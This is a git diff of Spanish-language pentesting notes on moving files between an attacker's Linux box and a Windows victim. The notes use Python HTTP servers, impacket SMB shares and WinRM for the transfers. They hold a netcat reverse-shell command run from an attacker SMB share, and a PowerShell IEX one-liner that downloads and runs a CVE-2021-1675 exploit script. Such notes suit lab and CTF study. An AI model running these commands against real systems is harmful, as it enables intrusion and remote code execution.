@@ -16,6 +16,7 @@ C:\Windows\Temp
 2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
 3. ❯ python3 -m http.server 80          # Creamos un servidor 
 4. ❯ impacket-smbserver smbFolder --smb2support
+5. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un server para tranferir el archivo a Windows compartiendo el dir actual con 'pwd'
 ```
 
 ```bash 
@@ -31,17 +32,20 @@ C:\Windows\Temp
 	# IP = Direccion de la maquina de atacante Linux
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
 
-4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
-```
-
-```bash
-
-❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
+4. \\\\<IP>\smbFolder\nc.exe -e cmd <IP> 443 
+ 
+5. ❯ copy \\❮IP❯\smbFolder\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
 
 	# IP = IP de atacante
 	# smbFolder = Nombre del folder del recurso compartido
 	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
 	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
+```
+
+```bash
+# Si tenemos una sesion con WinRM, podemos usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
+❯ upload /ruta/abosluta/maquina/atacante/file.exe 
+❯ download /ruta/abosluta/maquina/atacante/file.exe      # Pasar el archivo desde la maquina Windows a Linux con WinRM
 
 ❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
 ```
